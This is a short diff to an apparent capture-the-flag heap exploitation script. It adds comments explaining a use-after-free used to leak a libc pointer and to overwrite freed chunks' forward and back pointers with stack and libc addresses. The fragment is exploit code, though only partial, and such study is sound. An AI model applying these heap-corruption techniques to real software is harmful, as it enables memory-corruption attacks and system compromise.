@@ -85,6 +85,7 @@ add(2, b"to be edited note")
 #remove(2)
 remove(0)
 
+# utiliz use after free to leak pointer
 libc_leak = int(show(0)[:6][::-1].hex(), 16)
 print("libc leak: ", hex(libc_leak))
 
@@ -139,6 +140,7 @@ edit("0"*1024 + "2", b"hopefully went through unsorted bins and moved freed 0 en
 #  fd: libc_leak + 0x100
 #  bk: stack_leak + ???
 
+# edit freed entries - use after free
 edit(3, p64(stack_leak-9)+p64(libc_leak+0x100))
 edit(5, p64(libc_leak+0x100)+p64(stack_leak-9))
 
